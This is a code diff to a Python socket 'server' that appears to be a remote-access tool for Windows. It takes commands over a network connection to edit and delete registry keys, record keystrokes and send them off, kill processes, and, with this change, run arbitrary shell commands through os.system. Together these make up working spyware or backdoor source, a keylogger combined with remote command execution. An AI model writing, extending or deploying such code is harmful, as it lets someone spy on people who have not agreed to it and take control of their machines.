@@ -6,6 +6,7 @@ import os
 import pyautogui
 import registry
 from winreg import *
+from time import sleep
 import keyboard #pip install keyboard
 
 mp={
@@ -22,7 +23,7 @@ class Server(object):
         self.root.title("Server")
 
         #mainframe
-        self.mainframe = ttk.Frame(self.root, padding="100 100 250 250")
+        self.mainframe = ttk.Frame(self.root, padding="25 25 50 50")
         self.mainframe.grid(column=0, row=0, sticky=(N,W,E,S))
         self.root.columnconfigure(0, weight=1)
         self.root.rowconfigure(0, weight=1)
@@ -120,7 +121,7 @@ class Server(object):
             if registry.deleteKey(arr[1])==True:
                 self.conn.send('Completed'.encode())
             else:
-                self.conn.send('Failure'.encode())
+                self.conn.send('Failed'.encode())
         elif Str.decode().find('SETVALUE')!=-1:
             print(Str.decode())
             arr = Str.decode().split('%')
@@ -129,11 +130,28 @@ class Server(object):
                 if registry.setValue(mp[brr[0]],brr[1],arr[2],arr[3],arr[4]) == True:
                     self.conn.send('Completed'.encode())
                 else:
-                    self.conn.send('Failure'.encode())
+                    self.conn.send('Failed'.encode())
             except:
-                self.conn.send('Failure'.encode())
+                self.conn.send('Failed'.encode())
+        elif Str.decode().find('KILL') != -1:
+            PID = int(Str.decode().split()[1])
+            try:
+                os.kill(PID, 9)
+                sleep(5)
+                self.conn.send('TRUE'.encode())
+            except:
+                self.conn.send('FALSE'.encode())
+                pass
+        elif Str.decode().find('START') != -1:
+            try:
+                os.system(Str.decode().split()[1])
+                sleep(5)
+                self.conn.send('TRUE'.encode())
+            except:
+                self.conn.send('FALSE'.encode())
+                pass
         elif Str.decode() == 'KEYLOG':
-            bep = threading.Thread(target=self.startKeylogging())
+            bep = threading.Thread(target=self.startKeylogging)
             bep.start()
         elif Str.decode() == 'KEYSTOP':
             self.stopKeylogging()
@@ -172,8 +190,7 @@ class Server(object):
     def startKeylogging(self):
         keyboard.on_release(self.__callback)
         self.__report()
-        waitKey = threading.Thread(target=keyboard.wait)
-        waitKey.start()
+        keyboard.wait()
     #TODO: Unhook
     def stopKeylogging(self):
         keyboard.unhook(self.__callback)
@@ -184,4 +201,8 @@ class Server(object):
         close_it.start()
 ins=Server()
 mainz=threading.Thread(target=ins.main_form)
-mainz.start()
+try:
+    mainz.start()
+except:
+    ins.Connect()
+    pass
